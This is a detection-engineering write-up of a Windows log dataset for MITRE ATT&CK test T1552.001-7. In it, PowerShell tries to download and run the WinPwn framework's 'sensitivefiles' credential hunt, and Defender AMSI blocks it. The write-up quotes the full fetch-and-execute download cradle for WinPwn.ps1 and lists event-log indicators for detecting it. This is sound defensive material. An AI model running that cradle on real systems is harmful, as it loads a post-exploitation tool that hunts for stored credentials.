# T1552.001-7: Credentials In Files — WinPwn - sensitivefiles

## Technique Context

MITRE ATT&CK T1552.001 (Credentials in Files) encompasses automated credential hunting tools that sweep the filesystem for files likely to contain credentials. Test 7 uses WinPwn, a PowerShell-based post-exploitation framework by S3cur3Th1sSh1t. The `sensitivefiles` function searches for files with names or contents that commonly contain credentials — configuration files, password stores, SSH keys, database files, and similar targets. WinPwn is downloaded at runtime from GitHub and executed in memory, making it a realistic representation of a live-off-the-land attack pattern. In this execution, Windows Defender blocked the download.

## What This Dataset Contains

The dataset spans approximately nine seconds (00:25:51–00:26:00 UTC) and contains 101 events across three log sources.

**The technique attempt and its blocking are captured.** The PowerShell EID 4104 script block log preserves the complete test framework invocation:

```
& {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sensitivefiles -noninteractive -consoleoutput}
```

The EID 4103 module log records `CommandInvocation(New-Object)` with `TypeName: net.webclient` — confirming PowerShell attempted the HTTP download.

A PowerShell EID 4100 error event records the Defender block:

```
Error Message = At line:1 char:1
+ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpression
```

This confirms that Defender's AMSI integration intercepted WinPwn after the download completed but before execution, triggering on the script content itself. The download succeeded at the network layer; the block occurred at AMSI script evaluation.

Sysmon EID 3 (Network connection) is present, recording the outbound TCP connection from PowerShell. EID 22 (DNS query) is also captured, showing the DNS resolution for `raw.githubusercontent.com`. The Sysmon EID 7 DLL image load sequence shows PowerShell startup, including the `MpOAV.dll` Defender module load (tagged T1574.002).

Security EID 4688 records the PowerShell process launch with the full command line. EID 4689 records the exit.

## What This Dataset Does Not Contain (and Why)

**WinPwn did not execute.** Defender blocked the script via AMSI before the `sensitivefiles` function ran. No file system enumeration, no credential access, and no WinPwn-specific output is present in the data. This dataset captures the attempt and the block, not a successful technique execution.

**No `sensitivefiles` function telemetry.** Because execution was prevented, there are no child process creations, no file read events, and no PowerShell cmdlets from WinPwn itself appear in the module log.

**The downloaded content is not in the log.** AMSI triggers on the downloaded script in memory; the content itself is not logged. The EID 4100 error confirms the block occurred at `Invoke-Expression`.

## Assessment

This dataset is valuable precisely because it represents the realistic outcome of a well-defended endpoint encountering a known-malicious tool. The full attack chain is visible up to the point of blocking: command intent in script block logging, the `net.webclient` download attempt in module logging, the DNS query and network connection in Sysmon, and the AMSI block in the PowerShell error log. The nine-second duration reflects a genuine download followed by immediate blocking. Defenders building detection coverage for WinPwn should note that the script block log and the Defender block event together constitute a high-confidence detection even when execution is prevented.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104**: Script block containing `iex(new-object net.webclient).downloadstring(...)` combined with `sensitivefiles` — a direct WinPwn indicator. The specific GitHub URL (including commit hash) is an exact match indicator.
- **PowerShell EID 4100**: `ScriptContainedMaliciousContent` error from `Invoke-Expression` — confirms Defender/AMSI blocked the script. Pairing this with the preceding 4104 identifies what was blocked.
- **PowerShell EID 4103**: `CommandInvocation(New-Object)` with `TypeName: net.webclient` followed by `.downloadstring()` is a classic cradle pattern for in-memory execution.
- **Sysmon EID 22**: DNS query for `raw.githubusercontent.com` from `powershell.exe` running as SYSTEM with no interactive session is a strong behavioral signal for script download cradles.
- **Sysmon EID 3**: Outbound TCP from `powershell.exe` as NT AUTHORITY\SYSTEM to github raw content CDN (185.199.x.x) warrants investigation in environments where this is not expected.
- **Correlation**: The combination of EID 4104 (script block with download cradle), EID 22 (DNS), EID 3 (network connection), and EID 4100 (AMSI block) forms a complete behavioral sequence that is highly specific to this attack pattern.
